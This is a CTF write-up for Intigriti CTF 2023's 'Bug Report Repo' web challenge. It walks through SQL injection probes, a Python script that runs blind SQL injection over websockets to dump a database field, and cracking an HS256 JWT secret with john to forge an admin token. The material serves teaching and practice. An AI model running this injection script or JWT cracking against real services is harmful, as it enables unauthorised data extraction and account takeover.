---
title: Intigriti CTF 2023 Writeup [WEB]
author: H0j3n
date: 2023-11-19 00:00:00
categories: [ctf]
tags: [ctf,writeup]
render_with_liquid: false
---

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_1.png)

Link to archive challenges: 

- [https://github.com/sajjadium/ctf-archives/tree/main/ctfs/1337UP/2023](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/1337UP/2023)

# Category : Web

## Web : Bug Report Repo

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_2.png)

Browsing the web challenge, we will encounter with a page that show the "Bug Reports". There is one visible search box that we can use to check the report **status** by using **BUG ID**

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_3.png)

When we enter `BUG ID == 1` we can see the page highligted the first row but where is the user `Alice` coming from? Probably its query something behind this. 

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_4.png)

How about if we try to insert single quote `'` instead? We got an error? Is there SQL Injection involved in here?

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_5.png)

Let's try put a custom query to make it correct query. 

**Correct Response**

```cs
1 OR 1=1
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_6.png)

**Wrong Response**

```cs
1 AND 1=2
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_7.png)

Since we know it involve **SQL INJECTION**, next step is to find where is the flag located? It was mentioned in the challenge's description that it received a **CRITICAL** bug but it was not shown in the system. When we try to check on `BUG ID == 11` we receive an unusual user in the response.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_8.png)

Probably we will get hints when we look into this user's description. To do that we need exploit the **SQL Injection** and extract the description of bug id equal to 1. We can create an automation script to extract it. We also identified that its using *WEBSOCKETS* for the request.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_9.png)

Below are the full scripts to extract the description of `BUGID == 11`

```python
import string, base64
from websockets.sync.client import connect

def sqli(ws,q_left,chars):	
    data = """{"id":"11 and (%s='%s')"}""" % (q_left, chars)
    ws.send(data)
    temp = ws.recv()
    return "Open" in temp

def exploit_websockets(TARGET):
    dumped = ""
    with connect(TARGET) as ws:
        sql_template = "SELECT substr(description, %s, 1)"
        i = 1
        while True:
            for chars in string.printable:
                if sqli(ws,sql_template%i,chars):
                    dumped += chars
                    print(dumped)
                    i+=1
                    break
            return
        
if __name__ == "__main__":
    TARGET = "wss://bountyrepo.ctf.intigriti.io/ws"
    exploit_websockets(TARGET)
```

Extracted : `crypt0:c4tz on /4dm1n_z0n3, really?`

Browsing `/4dm1n_z0n3` will get us into a secure admin login page. 

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_10.png)

Using the credentials we found will get us into this page. Sadly our user `crypt0` don't have the permission to view the config key.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_11.png)

When we look at the cookies, it looks like **JWT** and yes it is. It using `alg == HS256`

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_12.png)

By reading in the [Hacktricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555) we probably need to crack the JWT and find the secret key? Let's give it a try using [jwtcrack](https://github.com/Sjord/jwtcrack)

> `Algorithm HS256` : Uses the secret key to sign and verify each message
{: .prompt-info }

```
# jwt2john
./jwt2john.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I" > hash

# john
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Found : `catsarethebest`

Next, we can easily modify our **JWT** in [here](https://jwt.io/) with the secret key we found.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_13.png)

And we get the flag!

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/13_intigritictf_2023/intigriti_14.png)

Flag : `INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}`